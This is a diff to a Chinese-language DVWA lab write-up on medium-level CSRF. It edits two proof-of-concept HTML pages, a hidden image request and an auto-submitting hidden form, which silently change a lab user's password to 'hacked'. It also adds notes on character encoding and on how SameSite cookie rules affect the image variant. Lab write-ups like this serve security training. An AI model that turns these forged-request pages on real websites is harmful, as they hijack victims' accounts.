@@ -83,22 +83,31 @@ Referer: http://攻击者IP/192.168.1.100.html
 
 ```html
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
+    <meta charset="utf-8">
     <title>CSRF Medium PoC</title>
 </head>
 <body>
-    <h1>正在加载...</h1>
-    <img src="http://192.168.1.100/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none;">
+    <p>正在加载…</p>
+    <img src="http://192.168.1.100/dvwa/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked&amp;Change=Change" style="display:none;">
 </body>
 </html>
 ```
+
+`<meta charset="utf-8">` 不能省：文件按 UTF-8 存但页面不声明编码时，浏览器会按 GBK 解码，「正在加载…」就变乱码了。
+
+同样的 SameSite 限制在这里也存在——`<img>` 是子资源请求，Chrome 下带不上 Cookie，用下面的表单版更稳。
 
 或者使用自动提交表单：
 
 ```html
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <title>CSRF Medium PoC</title>
+</head>
 <body onload="document.csrf_form.submit()">
     <form name="csrf_form" action="http://192.168.1.100/dvwa/vulnerabilities/csrf/" method="GET">
         <input type="hidden" name="password_new" value="hacked">
